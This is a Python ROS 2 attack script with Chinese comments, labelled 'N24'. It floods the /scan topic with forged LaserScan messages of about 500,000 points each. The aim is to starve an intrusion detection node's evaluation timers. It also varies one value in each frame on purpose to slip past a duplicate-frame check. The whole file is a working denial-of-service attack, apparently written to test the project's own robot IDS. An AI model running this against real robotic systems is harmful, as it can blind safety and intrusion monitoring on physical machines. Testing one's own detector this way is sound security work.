#!/usr/bin/env python3
"""攻擊 N24 — Oversized message DoS（單一超大訊息，QoS 丟不掉）.

N20（rate flood）失敗的原因：QoS 在洪水下自動丟包，receiver 只處理少數。
N24 換思路：**單一一個超大訊息一旦送達就一定得處理**，QoS 丟不掉「正在處理的這一個」。

目標：IDS 訂 /scan，_scan_cb 對每筆做 `list(msg.ranges)` 存進 deque(20)，
D3 又對歷史跑 numpy。發一個帶數十萬~數百萬點的假 /scan →
單筆處理成本爆高 → 餓死 IDS 的 _evaluate(0.5s) / _print_stats(5s) timer。

量測：外部觀察 IDS _print_stats 5s cadence 是否被拉長。
"""
import sys
import math
import time
import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy
from sensor_msgs.msg import LaserScan


def main():
    n_points = int(sys.argv[1]) if len(sys.argv) > 1 else 500_000
    rate_hz = float(sys.argv[2]) if len(sys.argv) > 2 else 5.0
    duration = float(sys.argv[3]) if len(sys.argv) > 3 else 20.0

    rclpy.init()
    node = Node('attacker_oversized_scan')
    qos = QoSProfile(depth=10, reliability=ReliabilityPolicy.BEST_EFFORT)
    pub = node.create_publisher(LaserScan, '/scan', qos)

    print(f'🌊 N24: 發 {n_points:,} 點的超大 /scan，{rate_hz}Hz，{duration:.0f}s', flush=True)
    sent = 0
    period = 1.0 / rate_hz
    deadline = time.monotonic() + duration
    next_t = time.monotonic()
    # 預先建好 ranges（每筆都加一點點抖動避免被「連續幀相同」偵測直接擋）
    base = [1.0] * n_points
    while time.monotonic() < deadline:
        now = time.monotonic()
        if now >= next_t:
            m = LaserScan()
            m.header.stamp = node.get_clock().now().to_msg()
            m.header.frame_id = 'base_link'
            m.angle_min = 0.0
            m.angle_max = 2 * math.pi
            m.angle_increment = (2 * math.pi) / n_points
            m.range_min = 0.1
            m.range_max = 3.5
            # 每筆改一個值，避免「與上一幀完全相同」
            base[sent % n_points] = 1.0 + (sent % 7) * 0.01
            m.ranges = base
            pub.publish(m)
            sent += 1
            print(f'  已發 #{sent}（{n_points:,} 點）', flush=True)
            next_t = now + period
        rclpy.spin_once(node, timeout_sec=0.05)
    print(f'⏹ 結束：共發 {sent} 個超大 scan', flush=True)
    node.destroy_node()
    rclpy.shutdown()


if __name__ == '__main__':
    main()
